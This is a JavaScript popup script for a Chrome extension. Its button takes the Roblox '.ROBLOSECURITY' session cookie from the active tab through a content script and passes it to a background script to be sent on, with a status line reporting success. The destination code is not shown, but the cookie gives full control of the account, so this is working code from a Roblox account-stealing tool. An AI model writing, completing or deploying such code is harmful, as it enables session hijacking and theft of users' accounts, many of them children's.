document.getElementById('sendCookieButton').addEventListener('click', () => {
    // Query the active tab to get the currently opened Roblox page
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        // Send a message to the content script to retrieve the ROBLOSECURITY cookie
        chrome.tabs.sendMessage(tabs[0].id, { action: 'getRobloxCookie' }, (response) => {
            if (response && response.cookie) {
                // If the cookie is found, send it to the background script
                chrome.runtime.sendMessage({ action: 'sendCookie', cookie: response.cookie }, (backgroundResponse) => {
                    const statusElement = document.getElementById('status');
                    
                    if (backgroundResponse.success) {
                        statusElement.textContent = 'Cookie sent successfully!';
                    } else {
                        statusElement.textContent = 'Failed to send cookie.';
                    }
                });
            } else {
                // If no cookie is found, show an error message
                document.getElementById('status').textContent = '.ROBLOSECURITY Cookie not found.';
            }
        });
    });
});
